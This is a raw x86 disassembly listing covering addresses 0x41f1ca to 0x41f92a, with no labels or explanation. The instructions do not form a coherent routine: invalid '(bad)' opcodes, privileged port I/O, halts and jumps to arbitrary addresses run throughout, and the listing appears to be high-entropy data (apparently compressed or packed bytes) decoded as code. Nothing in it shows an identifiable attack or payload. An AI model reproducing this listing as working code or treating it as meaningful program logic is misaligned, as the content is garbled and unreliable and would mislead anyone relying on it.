  41f1ca:	loopne 0x41f1e7
  41f1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1cd:	jl     0x41f1a0
  41f1cf:	js     0x41f185
  41f1d1:	jae    0x41f24a
  41f1d3:	bound  ebx,QWORD PTR [ebp+0x10]
  41f1d6:	jae    0x41f1ad
  41f1d8:	jnp    0x41f226
  41f1da:	sbb    ch,BYTE PTR [esi-0xcbaea9f]
  41f1e0:	scas   eax,DWORD PTR es:[edi]
  41f1e1:	mov    edx,0x5b1b5734
  41f1e6:	push   0x2b72a8e5
  41f1eb:	xor    DWORD PTR [edi],esp
  41f1ed:	ds xchg esp,eax
  41f1ef:	mov    dh,BYTE PTR [edx-0x3d]
  41f1f2:	fcomp  QWORD PTR [edi]
  41f1f4:	fild   DWORD PTR [edi-0x63fa9758]
  41f1fa:	in     eax,dx
  41f1fb:	ret    
  41f1fc:	ja     0x41f25c
  41f1fe:	out    0xd8,al
  41f200:	stos   BYTE PTR es:[edi],al
  41f201:	sbb    eax,0x26ea2b15
  41f206:	std    
  41f207:	fdivr  DWORD PTR [ecx+esi*4]
  41f20a:	lds    eax,FWORD PTR [edx]
  41f20c:	sbb    al,0xdc
  41f20e:	push   ds
  41f20f:	pop    ebx
  41f210:	cmp    eax,0xbb93f3c4
  41f215:	lahf   
  41f216:	inc    ecx
  41f217:	jno    0x41f1c0
  41f219:	mov    dh,0x21
  41f21b:	(bad)  [edi+0x355dbdda]
  41f221:	adc    DWORD PTR [edx-0x4b],ecx
  41f224:	in     al,0xd1
  41f226:	mov    ebx,0xed72d807
  41f22b:	fwait
  41f22c:	jb     0x41f20a
  41f22e:	cli    
  41f22f:	hlt    
  41f230:	xlat   BYTE PTR ds:[ebx]
  41f231:	sbb    BYTE PTR [ebx],dh
  41f233:	pop    es
  41f234:	or     esi,DWORD PTR [ecx-0x481d13f9]
  41f23a:	imul   eax,DWORD PTR [ecx-0xda7650a],0xb60a694c
  41f244:	pop    ecx
  41f245:	mov    ecx,0x9bbeaba5
  41f24a:	xchg   edx,eax
  41f24b:	inc    esi
  41f24c:	fiadd  WORD PTR [edi+0x535ec140]
  41f252:	jo     0x41f2c8
  41f254:	pop    esi
  41f255:	jge    0x41f280
  41f257:	jg     0x41f230
  41f259:	push   esi
  41f25a:	mov    dh,0x32
  41f25c:	mov    al,0x75
  41f25e:	mov    bl,0xb9
  41f260:	data16 mov al,0x1
  41f263:	push   edi
  41f264:	je     0x41f26c
  41f266:	iret   
  41f267:	and    eax,esp
  41f269:	push   esp
  41f26a:	jo     0x41f249
  41f26c:	ficom  WORD PTR [ebx+0x25]
  41f26f:	aam    0x8e
  41f271:	std    
  41f272:	jl     0x41f25a
  41f274:	mov    ch,0x2b
  41f276:	rol    esp,0xbf
  41f279:	sbb    al,BYTE PTR [edx-0xf6934df]
  41f27f:	leave  
  41f280:	jg     0x41f29c
  41f282:	sbb    BYTE PTR [ebp+edx*4-0x3813b0f2],al
  41f289:	pop    edx
  41f28a:	push   es
  41f28b:	arpl   WORD PTR [ecx],dx
  41f28d:	add    al,0x34
  41f28f:	xor    eax,DWORD PTR [ebx+0x32]
  41f292:	in     eax,0x93
  41f294:	xor    DWORD PTR [ebp+edi*8+0x35],esp
  41f298:	test   ebp,0x5185d71b
  41f29e:	mov    dh,0x3c
  41f2a0:	aam    0x8d
  41f2a2:	shr    BYTE PTR [ecx],1
  41f2a4:	add    eax,0x1c5bf7d0
  41f2a9:	outs   dx,BYTE PTR ds:[esi]
  41f2aa:	mov    bh,0x98
  41f2ac:	jns    0x41f270
  41f2ae:	cwde   
  41f2af:	inc    ebp
  41f2b0:	jle    0x41f2c0
  41f2b2:	or     cl,BYTE PTR [ecx-0x64]
  41f2b5:	mov    ch,0x84
  41f2b7:	push   edx
  41f2b8:	les    ecx,FWORD PTR [ebx-0x28d86627]
  41f2be:	push   esp
  41f2bf:	cs inc edi
  41f2c1:	jmp    0x4fe54a5c
  41f2c6:	gs and al,0x35
  41f2c9:	fwait
  41f2ca:	mov    bh,0xd5
  41f2cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2cd:	and    bl,BYTE PTR cs:[esi+0x4a77987]
  41f2d4:	add    bl,BYTE PTR [ebx+eax*2]
  41f2d7:	repnz stos BYTE PTR es:[edi],al
  41f2d9:	es push ds
  41f2db:	adc    al,0x2c
  41f2dd:	push   ss
  41f2de:	xor    eax,0xc8c77f41
  41f2e3:	and    bh,0x8a
  41f2e6:	repz mov al,0xdf
  41f2e9:	jbe    0x41f2b1
  41f2eb:	dec    edi
  41f2ec:	push   esp
  41f2ed:	mov    bh,0x5e
  41f2ef:	fdivr  DWORD PTR [edi-0x2c]
  41f2f2:	ins    DWORD PTR es:[edi],dx
  41f2f3:	push   eax
  41f2f4:	and    edx,DWORD PTR [ebx-0x60]
  41f2f7:	xchg   esp,eax
  41f2f8:	ins    DWORD PTR es:[edi],dx
  41f2f9:	adc    BYTE PTR [eax-0x75],al
  41f2fc:	dec    esp
  41f2fd:	sbb    edi,DWORD PTR [eax]
  41f2ff:	dec    ebp
  41f300:	pop    esi
  41f301:	sbb    eax,0xbe44ce67
  41f306:	adc    ch,BYTE PTR [ebp+0x36d8e8dd]
  41f30c:	lea    ecx,[edi]
  41f30e:	add    esi,DWORD PTR [eax-0x79]
  41f311:	(bad)  
  41f312:	(bad)  
  41f313:	mov    ebp,0xe60d21ac
  41f318:	out    dx,al
  41f319:	neg    esp
  41f31b:	mov    esi,0x34c275d6
  41f320:	mov    bh,0x52
  41f322:	xor    eax,0x9494f69d
  41f327:	ins    DWORD PTR es:[edi],dx
  41f328:	cmp    eax,0xe23803f2
  41f32d:	sbb    dh,BYTE PTR [edi]
  41f32f:	and    DWORD PTR [ecx],esi
  41f331:	push   esi
  41f332:	jno    0x41f3ae
  41f334:	mov    dh,0x11
  41f336:	dec    esp
  41f337:	pop    es
  41f338:	icebp  
  41f339:	daa    
  41f33a:	and    eax,0xad347d79
  41f33f:	xchg   esp,eax
  41f340:	mov    ds:0x90910332,al
  41f345:	cmp    ah,BYTE PTR [edi+0x41]
  41f348:	dec    edi
  41f349:	mov    ebp,0x1f846a12
  41f34e:	cmp    BYTE PTR [ebx],ch
  41f350:	gs jge 0x41f3b4
  41f353:	add    edx,DWORD PTR [ebp+0x43e2c715]
  41f359:	push   0xffffffc2
  41f35b:	pop    edx
  41f35c:	fucomp st(4)
  41f35e:	test   DWORD PTR [edi+0x23e04c04],eax
  41f364:	cmp    al,dl
  41f366:	mov    ah,0x98
  41f368:	fst    DWORD PTR [edi]
  41f36a:	(bad)  
  41f36b:	sub    al,0xd7
  41f36d:	mov    edx,0x2ea8a01d
  41f372:	arpl   WORD PTR [edi+ebp*1],bp
  41f375:	outs   dx,DWORD PTR ds:[esi]
  41f376:	nop
  41f377:	call   0xd500:0x7f56f3e1
  41f37e:	out    dx,al
  41f37f:	jbe    0x41f37e
  41f381:	and    eax,0xc9662b3a
  41f386:	xor    ebx,DWORD PTR [ebp+0x1c81683e]
  41f38c:	mov    ebp,0x731f845d
  41f391:	fisttp QWORD PTR [esi-0x6]
  41f394:	pop    edx
  41f395:	add    ch,BYTE PTR [esi+0x4a]
  41f398:	push   edi
  41f399:	test   BYTE PTR [edi],bl
  41f39b:	dec    edx
  41f39c:	inc    esi
  41f39d:	fs mov eax,0x19ce6d6a
  41f3a3:	jp     0x41f350
  41f3a5:	cld    
  41f3a6:	aam    0x67
  41f3a8:	dec    esp
  41f3a9:	cmp    cl,BYTE PTR [esi-0x7f]
  41f3ac:	inc    edi
  41f3ad:	push   eax
  41f3ae:	ror    DWORD PTR [ecx],0x94
  41f3b1:	into   
  41f3b2:	arpl   dx,ax
  41f3b4:	add    BYTE PTR [eax-0x4228f142],ah
  41f3ba:	mov    ebx,0x2d14c4cd
  41f3bf:	das    
  41f3c0:	mov    al,ds:0x206d4500
  41f3c5:	jnp    0x41f3bb
  41f3c7:	sbb    eax,0x8adb55b5
  41f3cc:	and    esi,edx
  41f3ce:	push   eax
  41f3cf:	sbb    DWORD PTR [esi-0x63],esi
  41f3d2:	xor    al,0x88
  41f3d4:	pop    ebx
  41f3d5:	stos   BYTE PTR es:[edi],al
  41f3d6:	push   es
  41f3d7:	imul   esi,DWORD PTR [eax+0x23ca161d],0x23
  41f3de:	pop    DWORD PTR [ecx]
  41f3e0:	and    BYTE PTR [ebx-0x4],dl
  41f3e3:	fadd   st,st(3)
  41f3e5:	inc    ecx
  41f3e6:	sbb    eax,0x794c33f3
  41f3eb:	xchg   ecx,eax
  41f3ec:	xchg   edi,eax
  41f3ed:	fs cmc 
  41f3ef:	jg     0x41f3e0
  41f3f1:	adc    eax,0x5ae38b3f
  41f3f6:	test   eax,0x2593daea
  41f3fb:	nop
  41f3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3fd:	dec    ebp
  41f3fe:	push   ecx
  41f3ff:	outs   dx,DWORD PTR ds:[esi]
  41f400:	push   ebx
  41f401:	mov    dl,0x9b
  41f403:	loop   0x41f39b
  41f405:	xor    eax,0x383e504c
  41f40a:	stos   DWORD PTR es:[edi],eax
  41f40b:	push   ecx
  41f40c:	rcl    edi,cl
  41f40e:	push   ebx
  41f40f:	sub    eax,0xb7922cdf
  41f414:	enter  0x15f6,0x82
  41f418:	mov    al,0xc1
  41f41a:	xchg   BYTE PTR [ecx-0x23],bl
  41f41d:	mov    ds:0x34de15ba,al
  41f422:	pushf  
  41f423:	bound  edi,QWORD PTR [eax-0x71]
  41f426:	fstp   DWORD PTR [ecx-0x1b]
  41f429:	sbb    eax,0x1da5ceef
  41f42e:	das    
  41f42f:	leave  
  41f430:	jne    0x41f3be
  41f432:	mov    eax,ds
  41f434:	hlt    
  41f435:	or     esp,DWORD PTR [ebx-0x29c11df1]
  41f43b:	cmc    
  41f43c:	loopne 0x41f400
  41f43e:	mov    cl,0x98
  41f440:	loope  0x41f44e
  41f442:	push   ebx
  41f443:	add    eax,0x62ac7960
  41f448:	adc    BYTE PTR [edi],dh
  41f44a:	or     edx,DWORD PTR [ebx+0x3f]
  41f44d:	and    ah,ah
  41f44f:	stos   DWORD PTR es:[edi],eax
  41f450:	fild   DWORD PTR [edi+eax*2]
  41f453:	mov    esi,0x3f52858f
  41f458:	inc    edi
  41f459:	out    dx,eax
  41f45a:	sti    
  41f45b:	xor    al,0x2c
  41f45d:	scas   eax,DWORD PTR es:[edi]
  41f45e:	test   BYTE PTR [eax+ecx*1],bh
  41f461:	int3   
  41f462:	mov    ebx,0x7379a2c8
  41f467:	rcr    ebx,1
  41f469:	test   dl,al
  41f46b:	loopne 0x41f439
  41f46d:	dec    esp
  41f46e:	int3   
  41f46f:	jmp    0xdb193d66
  41f474:	sub    eax,0x4e7bf007
  41f479:	jnp    0x41f46b
  41f47b:	pop    esi
  41f47c:	cli    
  41f47d:	aaa    
  41f47e:	xchg   ebx,eax
  41f47f:	or     dh,0x39
  41f482:	or     edi,DWORD PTR ds:0x234a50d2
  41f488:	jg     0x41f443
  41f48a:	repnz dec ebp
  41f48c:	adc    eax,0x7857289b
  41f491:	push   ss
  41f492:	(bad)  
  41f493:	hlt    
  41f494:	in     eax,dx
  41f495:	ins    DWORD PTR es:[edi],dx
  41f496:	jns    0x41f454
  41f498:	sub    edx,DWORD PTR [ebx-0x6099b3c9]
  41f49e:	mov    cl,0xf1
  41f4a0:	push   esi
  41f4a1:	xchg   BYTE PTR [eax-0x53],al
  41f4a4:	xchg   ecx,eax
  41f4a5:	xchg   edi,eax
  41f4a6:	or     DWORD PTR [eax+0x2bc7fdf0],edx
  41f4ac:	lods   al,BYTE PTR ds:[esi]
  41f4ad:	push   ss
  41f4ae:	mov    ah,0xc5
  41f4b0:	lds    ebx,FWORD PTR [edi+ebp*2]
  41f4b3:	mov    bh,0x41
  41f4b5:	push   ds
  41f4b6:	fisub  DWORD PTR [edi+0x2f4e8da6]
  41f4bc:	jg     0x41f52f
  41f4be:	test   eax,0x7f7ae
  41f4c3:	out    0x4c,eax
  41f4c5:	aas    
  41f4c6:	jns    0x41f4e1
  41f4c8:	or     BYTE PTR [edi],dh
  41f4ca:	ins    BYTE PTR es:[edi],dx
  41f4cb:	rcl    dh,0xba
  41f4ce:	das    
  41f4cf:	mov    BYTE PTR [eax],al
  41f4d1:	pop    ebx
  41f4d2:	and    DWORD PTR [esp+ebx*1-0x74],edx
  41f4d6:	push   es
  41f4d7:	and    DWORD PTR [ecx+0x27915002],ebp
  41f4dd:	mov    edx,0xcfff259c
  41f4e2:	cmp    ch,bl
  41f4e4:	shr    DWORD PTR [edi],0x65
  41f4e7:	pop    esp
  41f4e8:	pop    esi
  41f4e9:	retf   0x32dd
  41f4ec:	jge    0x41f4bd
  41f4ee:	xchg   ebx,eax
  41f4ef:	retf   0x400
  41f4f2:	push   ss
  41f4f3:	lods   al,BYTE PTR ds:[esi]
  41f4f4:	std    
  41f4f5:	push   ecx
  41f4f6:	cs push esi
  41f4f8:	stos   BYTE PTR es:[edi],al
  41f4f9:	pop    ss
  41f4fa:	fadd   DWORD PTR cs:[ebp-0xefbec42]
  41f501:	aad    0x2f
  41f503:	mov    bh,0xcb
  41f505:	push   ecx
  41f506:	dec    eax
  41f507:	jo     0x41f4ce
  41f509:	sub    edi,DWORD PTR [ebx+esi*4-0x57]
  41f50d:	pop    esi
  41f50e:	push   cs
  41f50f:	call   0xb23104b8
  41f514:	dec    esp
  41f515:	test   eax,0x8525891a
  41f51a:	jg     0x41f564
  41f51c:	jae    0x41f4f4
  41f51e:	popa   
  41f51f:	lea    ebx,[edi-0x4699a96b]
  41f525:	fstp   QWORD PTR [ebp-0x12]
  41f528:	mov    ah,0xce
  41f52a:	nop
  41f52b:	and    ebp,DWORD PTR [edx-0x7d9b131b]
  41f531:	adc    al,0xe1
  41f533:	mov    al,0x2c
  41f535:	adc    al,0xbb
  41f537:	push   edx
  41f538:	pop    ecx
  41f539:	nop
  41f53a:	fldcw  WORD PTR [ebx+0x4f]
  41f53d:	pop    ebx
  41f53e:	ja     0x41f596
  41f540:	cmp    ah,0xed
  41f543:	mov    dl,BYTE PTR [edi+0x2f]
  41f546:	ins    DWORD PTR es:[edi],dx
  41f547:	dec    eax
  41f548:	sub    BYTE PTR [edx+ecx*8-0x2a315735],ch
  41f54f:	inc    esi
  41f550:	add    al,0xaf
  41f552:	dec    edx
  41f553:	adc    DWORD PTR [ebx],edx
  41f555:	or     bl,al
  41f557:	shr    BYTE PTR [edx],cl
  41f559:	inc    ecx
  41f55a:	out    0xda,al
  41f55c:	(bad)  
  41f55d:	jecxz  0x41f5b2
  41f55f:	sbb    dl,BYTE PTR [ebx+0x66]
  41f562:	rol    BYTE PTR [ebx],cl
  41f564:	in     eax,dx
  41f565:	popf   
  41f566:	or     al,0x12
  41f568:	jbe    0x41f54e
  41f56a:	pop    ebx
  41f56b:	(bad)  
  41f56c:	outs   dx,BYTE PTR ds:[esi]
  41f56d:	fild   WORD PTR [edi+0x62]
  41f570:	fldcw  WORD PTR [eax+0x4146816]
  41f576:	cwde   
  41f577:	fidiv  DWORD PTR [ecx+0x3a]
  41f57a:	out    dx,eax
  41f57b:	mov    edx,0x256be56b
  41f580:	mov    ds:0x50f0e64c,eax
  41f585:	push   esi
  41f586:	adc    al,0x42
  41f588:	pop    ss
  41f589:	jne    0x41f586
  41f58b:	mov    esp,0xcf4f81eb
  41f590:	jle    0x41f588
  41f592:	arpl   WORD PTR [eax],bp
  41f594:	jge    0x41f5bf
  41f596:	or     DWORD PTR [esp+ebx*2],edi
  41f599:	retf   0xca9c
  41f59c:	loopne 0x41f579
  41f59e:	sbb    eax,0x2421df7c
  41f5a3:	mov    edi,0x6f011af8
  41f5a8:	add    eax,0x48b9a797
  41f5ad:	xor    eax,DWORD PTR [ecx-0x5b]
  41f5b0:	les    eax,FWORD PTR [ebp-0x2250b2d1]
  41f5b6:	dec    esi
  41f5b7:	pop    esp
  41f5b8:	std    
  41f5b9:	and    al,BYTE PTR [ecx+0x55]
  41f5bc:	jp     0x41f58a
  41f5be:	xor    eax,0x4b95d519
  41f5c3:	data16 ins BYTE PTR es:[edi],dx
  41f5c5:	mul    BYTE PTR [ebx]
  41f5c7:	sbb    BYTE PTR [eax+0x1aad86a5],0x3
  41f5ce:	pusha  
  41f5cf:	lods   eax,DWORD PTR ds:[esi]
  41f5d0:	mov    ebp,0x4f9f3222
  41f5d5:	dec    eax
  41f5d6:	out    dx,eax
  41f5d7:	rol    BYTE PTR [edi-0xdb463ed],cl
  41f5dd:	(bad)  
  41f5de:	sahf   
  41f5df:	enter  0x6c76,0xc1
  41f5e3:	inc    esp
  41f5e4:	mov    al,0x8
  41f5e6:	jecxz  0x41f62d
  41f5e8:	adc    al,0xcd
  41f5ea:	dec    edx
  41f5eb:	enter  0x75ca,0xf9
  41f5ef:	add    BYTE PTR ds:0xf126d753,ah
  41f5f5:	mov    al,ds:0xaa75abcd
  41f5fa:	in     eax,dx
  41f5fb:	out    0xad,al
  41f5fd:	mov    eax,ds:0xf212e7c2
  41f602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f603:	adc    eax,0x771cd0b9
  41f608:	xchg   BYTE PTR ds:0x5a7eea87,ch
  41f60e:	(bad)  [ebx+eax*8]
  41f611:	mov    ds:0x42079b25,eax
  41f616:	arpl   WORD PTR [esi-0x7a232a9a],sp
  41f61c:	rol    DWORD PTR ds:0x3adc775,0x1
  41f623:	xchg   BYTE PTR [ebx],bh
  41f625:	loope  0x41f668
  41f627:	(bad)  
  41f629:	addr16 inc esp
  41f62b:	pop    ss
  41f62c:	mov    esp,0xebf01c18
  41f631:	cmp    ah,BYTE PTR [edx-0x1fcf7b4]
  41f637:	lahf   
  41f638:	les    ecx,FWORD PTR [edi+0x74]
  41f63b:	jne    0x41f61f
  41f63d:	out    0xaa,eax
  41f63f:	cmc    
  41f640:	xor    BYTE PTR [edi+0x7f],0x2f
  41f644:	jecxz  0x41f69f
  41f646:	test   DWORD PTR [esi-0x28],edi
  41f649:	aad    0x43
  41f64b:	pop    edi
  41f64c:	jl     0x41f606
  41f64e:	cli    
  41f64f:	adc    ebx,DWORD PTR [eax]
  41f651:	jge    0x41f646
  41f653:	lock mov cl,0x28
  41f656:	(bad)  
  41f657:	in     eax,dx
  41f658:	je     0x41f684
  41f65a:	out    dx,eax
  41f65b:	mov    cl,0x7d
  41f65d:	dec    eax
  41f65e:	jmp    0x41f62a
  41f660:	jb     0x41f679
  41f662:	mov    ebx,0xed1dbdbc
  41f667:	add    al,0x65
  41f669:	sub    esi,DWORD PTR [edi-0x21ac6a5]
  41f66f:	sub    DWORD PTR [ebp+0x19],edx
  41f672:	cmp    BYTE PTR [esi],bl
  41f674:	cld    
  41f675:	mov    esi,0x94109850
  41f67a:	pop    ebx
  41f67b:	out    0xae,eax
  41f67d:	(bad)  [edi-0x4b3d16c4]
  41f683:	je     0x41f686
  41f685:	pop    ss
  41f686:	cwde   
  41f687:	nop
  41f688:	add    edx,DWORD PTR [ebx]
  41f68a:	sbb    bl,BYTE PTR [edx+edi*1+0x26f69161]
  41f691:	mov    ebp,0xade02e1f
  41f696:	sub    al,0xe8
  41f698:	and    eax,0x9b3702f3
  41f69d:	(bad)  
  41f69e:	mov    dh,0x18
  41f6a0:	pop    esi
  41f6a1:	test   DWORD PTR [ecx],eax
  41f6a3:	adc    eax,0xe5a4a3fd
  41f6a8:	dec    eax
  41f6a9:	jecxz  0x41f69e
  41f6ab:	outs   dx,DWORD PTR ds:[esi]
  41f6ac:	ins    DWORD PTR es:[edi],dx
  41f6ad:	movzx  esi,BYTE PTR [eax-0x72e81615]
  41f6b4:	pop    esp
  41f6b5:	cmp    BYTE PTR [esi+0x25],cl
  41f6b8:	cmp    eax,0xa654af03
  41f6bd:	outs   dx,BYTE PTR ds:[esi]
  41f6be:	cmp    BYTE PTR [edx+0x7d],dh
  41f6c1:	in     al,0x4d
  41f6c3:	or     DWORD PTR [eax+edi*4],ebp
  41f6c6:	or     DWORD PTR [esi],ebp
  41f6c8:	jge    0x41f6cf
  41f6ca:	lea    edi,[ecx-0x23e66b7]
  41f6d0:	mov    al,0x88
  41f6d2:	and    DWORD PTR [edx+0x57691aa0],edx
  41f6d8:	push   0x20
  41f6da:	pop    eax
  41f6db:	clc    
  41f6dc:	mov    DWORD PTR ss:[ecx-0x1ad042bc],edi
  41f6e3:	out    dx,al
  41f6e4:	mov    ah,0x8e
  41f6e6:	lods   eax,DWORD PTR ds:[esi]
  41f6e7:	pusha  
  41f6e8:	push   ebp
  41f6e9:	retf   0x51a3
  41f6ec:	jo     0x41f755
  41f6ee:	push   es
  41f6ef:	cld    
  41f6f0:	sub    ah,cl
  41f6f2:	inc    ebx
  41f6f3:	and    al,0x15
  41f6f5:	inc    ecx
  41f6f6:	or     al,0x14
  41f6f8:	clc    
  41f6f9:	xor    ah,BYTE PTR [edi*4+0x6096a785]
  41f700:	(bad)  
  41f701:	sbb    dl,ah
  41f703:	rol    bh,1
  41f705:	mov    al,ds:0x8e4e1e85
  41f70a:	and    al,0x8c
  41f70c:	repnz bnd jg 0x41f6b7
  41f710:	aad    0x39
  41f712:	ins    BYTE PTR es:[edi],dx
  41f713:	arpl   ax,si
  41f715:	rcr    ebx,cl
  41f717:	mov    dh,0xd4
  41f719:	enter  0xf584,0xc7
  41f71d:	adc    edi,edx
  41f71f:	add    bl,BYTE PTR [ecx+0x259b0613]
  41f725:	mov    ch,0xe9
  41f727:	popf   
  41f728:	addr16 mov eax,edi
  41f72b:	in     eax,0x73
  41f72d:	cmp    eax,0x270d6337
  41f732:	sub    al,0x72
  41f734:	aam    0x23
  41f736:	mov    al,0x66
  41f738:	lea    ecx,[edi+eax*2]
  41f73b:	add    esp,DWORD PTR [esi+esi*2]
  41f73e:	(bad)  
  41f73f:	push   esi
  41f740:	inc    edi
  41f741:	icebp  
  41f742:	or     DWORD PTR [ebp+0x7e3410ac],ebx
  41f748:	jl     0x41f743
  41f74a:	je     0x41f6f5
  41f74c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f74d:	mov    DWORD PTR [esp+esi*2-0x3071db4c],esi
  41f754:	gs loopne 0x41f77f
  41f757:	add    esi,DWORD PTR [ecx+0xbc62735]
  41f75d:	retf   
  41f75e:	rcl    BYTE PTR [ecx+0x7ea12b68],0x1c
  41f765:	test   BYTE PTR ds:0xcfbda13e,dl
  41f76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76c:	pop    edx
  41f76d:	call   0x3a443af8
  41f772:	push   edx
  41f773:	into   
  41f774:	sbb    eax,0xaa0633e6
  41f779:	pusha  
  41f77a:	outs   dx,DWORD PTR ds:[esi]
  41f77b:	and    ebx,DWORD PTR [eax+ebp*1+0x56fab796]
  41f782:	repnz sbb eax,0x36923ce5
  41f788:	xor    DWORD PTR [esi+0x70300745],edx
  41f78e:	js     0x41f79a
  41f790:	jne    0x41f774
  41f792:	repnz xchg ebx,esp
  41f795:	dec    eax
  41f796:	ds adc eax,0xd59507a0
  41f79c:	loop   0x41f7b6
  41f79e:	jbe    0x41f7c8
  41f7a0:	cld    
  41f7a1:	and    BYTE PTR [esi],al
  41f7a3:	xchg   ebp,eax
  41f7a4:	pop    es
  41f7a5:	retf   
  41f7a6:	xor    eax,DWORD PTR [esi]
  41f7a8:	mov    ah,0x66
  41f7aa:	add    DWORD PTR [esi+edi*4+0x2b],ebx
  41f7ae:	inc    edi
  41f7af:	adc    BYTE PTR [ebx],0xa1
  41f7b2:	cmp    BYTE PTR [ebx],cl
  41f7b4:	pop    esp
  41f7b5:	ja     0x41f7c9
  41f7b7:	jno    0x41f7f5
  41f7b9:	mov    eax,ds:0x75040665
  41f7be:	jp     0x41f7f0
  41f7c0:	scas   eax,DWORD PTR es:[edi]
  41f7c1:	mov    dh,0xe9
  41f7c3:	or     al,bh
  41f7c5:	idiv   BYTE PTR [ebx]
  41f7c7:	jp     0x41f7b9
  41f7c9:	data16 std 
  41f7cb:	and    eax,0x4d7fd43a
  41f7d0:	jo     0x41f7d4
  41f7d2:	adc    cl,bh
  41f7d4:	xchg   ecx,eax
  41f7d5:	addr16 jae 0x41f770
  41f7d8:	pusha  
  41f7d9:	cli    
  41f7da:	loope  0x41f7a8
  41f7dc:	xchg   esp,eax
  41f7dd:	mov    dh,0x25
  41f7df:	jbe    0x41f7cf
  41f7e1:	std    
  41f7e2:	adc    al,BYTE PTR ds:0x8fdc4e5
  41f7e8:	inc    eax
  41f7e9:	push   ds
  41f7ea:	mov    al,0xf8
  41f7ec:	clc    
  41f7ed:	sub    DWORD PTR [ecx+0x34],edx
  41f7f0:	es imul edx,esp,0x790a139
  41f7f7:	sahf   
  41f7f8:	jnp    0x41f81c
  41f7fa:	add    esi,edi
  41f7fc:	std    
  41f7fd:	cld    
  41f7fe:	cmp    DWORD PTR [ecx+0x1],ebp
  41f801:	nop
  41f802:	leave  
  41f803:	xchg   ebx,eax
  41f804:	push   edx
  41f805:	xchg   esp,eax
  41f806:	loop   0x41f839
  41f808:	bound  esp,QWORD PTR [esi]
  41f80a:	dec    eax
  41f80b:	fwait
  41f80c:	ds ins DWORD PTR es:[edi],dx
  41f80e:	push   ebp
  41f80f:	aaa    
  41f810:	repz lock pop edx
  41f813:	mov    ch,0xf0
  41f815:	stos   BYTE PTR es:[edi],al
  41f816:	loop   0x41f81c
  41f818:	cmp    al,BYTE PTR [ebx-0x23f0aabf]
  41f81e:	in     al,dx
  41f81f:	mov    ecx,0xc46343ed
  41f824:	pop    ss
  41f825:	jnp    0x41f87f
  41f827:	out    0xb6,eax
  41f829:	inc    eax
  41f82a:	xchg   edx,eax
  41f82b:	cdq    
  41f82c:	inc    eax
  41f82d:	cli    
  41f82e:	and    esi,edi
  41f830:	test   eax,0x8824bf32
  41f835:	push   0xffffffe1
  41f837:	inc    esp
  41f838:	(bad)  
  41f839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f83a:	inc    edx
  41f83b:	mov    ch,0x6d
  41f83d:	cmp    eax,0x3179734b
  41f842:	imul   edi,DWORD PTR [esi+edi*1+0x6d63d63f],0x21
  41f84a:	xor    BYTE PTR [ebx],ah
  41f84c:	push   es
  41f84d:	inc    eax
  41f84e:	outs   dx,DWORD PTR ds:[esi]
  41f84f:	push   eax
  41f850:	mov    al,0x1a
  41f852:	mov    ds:0x288a05e,eax
  41f857:	lahf   
  41f858:	adc    dl,BYTE PTR [edi+ecx*2+0xda5f50f]
  41f85f:	push   edi
  41f860:	lock inc eax
  41f862:	sahf   
  41f863:	ret    
  41f864:	push   0x1c
  41f866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f867:	xor    edi,DWORD PTR [edi-0x656765a1]
  41f86d:	xchg   DWORD PTR [edx-0x68],eax
  41f870:	adc    esp,eax
  41f872:	push   esp
  41f873:	jle    0x41f89d
  41f875:	mov    eax,DWORD PTR [edi+0x5c16390c]
  41f87b:	sti    
  41f87c:	sbb    eax,0xc8395330
  41f881:	enter  0xfa77,0xcf
  41f885:	dec    esi
  41f886:	jg     0x41f81d
  41f888:	outs   dx,BYTE PTR ds:[esi]
  41f889:	xchg   ebx,eax
  41f88a:	cmp    eax,0x66a67597
  41f88f:	inc    ebp
  41f890:	sbb    eax,0x2abc6f19
  41f895:	mov    bl,0x60
  41f897:	inc    edi
  41f898:	arpl   WORD PTR [ecx],bx
  41f89a:	push   esp
  41f89b:	das    
  41f89c:	cwde   
  41f89d:	gs inc esp
  41f89f:	mov    ebp,0xf3187cb2
  41f8a4:	pop    ds
  41f8a5:	(bad)  [edx]
  41f8a7:	shr    ebx,0x19
  41f8aa:	test   DWORD PTR [ecx+0x54cae7fa],esp
  41f8b0:	aaa    
  41f8b1:	(bad)  
  41f8b2:	push   esp
  41f8b3:	dec    ebx
  41f8b4:	and    al,0xef
  41f8b6:	dec    edi
  41f8b7:	test   al,0x3e
  41f8b9:	sbb    DWORD PTR [eax-0x2],esi
  41f8bc:	push   0xffffff8d
  41f8be:	mov    bh,0x81
  41f8c0:	xor    DWORD PTR [esi-0x6d],esi
  41f8c3:	cmp    ch,BYTE PTR [esi+0x4d5baa0e]
  41f8c9:	xor    BYTE PTR [ebx+0x3b],dh
  41f8cc:	dec    ecx
  41f8cd:	(bad)  
  41f8ce:	rcr    BYTE PTR [esi+ecx*8-0x1f892f71],1
  41f8d5:	loopne 0x41f928
  41f8d7:	sub    DWORD PTR [ebp+edi*2-0x14],ebx
  41f8db:	test   eax,0x5621669f
  41f8e0:	mov    al,ds:0x68273055
  41f8e5:	jno    0x41f86e
  41f8e7:	(bad)  
  41f8e8:	adc    bl,al
  41f8ea:	fidiv  DWORD PTR [ecx-0x59b9c3f9]
  41f8f0:	das    
  41f8f1:	or     al,0x9
  41f8f3:	adc    BYTE PTR [edi-0x62],0xf8
  41f8f7:	cld    
  41f8f8:	fisubr DWORD PTR [ebx-0x313ead14]
  41f8fe:	cwde   
  41f8ff:	sbb    al,0x1c
  41f901:	or     DWORD PTR [eax-0x24],ecx
  41f904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f905:	pop    esp
  41f906:	clc    
  41f907:	dec    eax
  41f908:	add    eax,DWORD PTR [esi+0x57]
  41f90b:	dec    esi
  41f90c:	test   al,0x81
  41f90e:	mov    WORD PTR [ebp+edi*8-0x546cb37f],fs
  41f915:	or     cl,0xa2
  41f918:	inc    edx
  41f919:	fnstcw WORD PTR [ebx-0x28483b7a]
  41f91f:	adc    ebx,DWORD PTR [ecx]
  41f921:	or     eax,0x2ad0edbb
  41f926:	je     0x41f99c
  41f928:	(bad)  
  41f929:	dec    edi
  41f92a:	out    dx,al
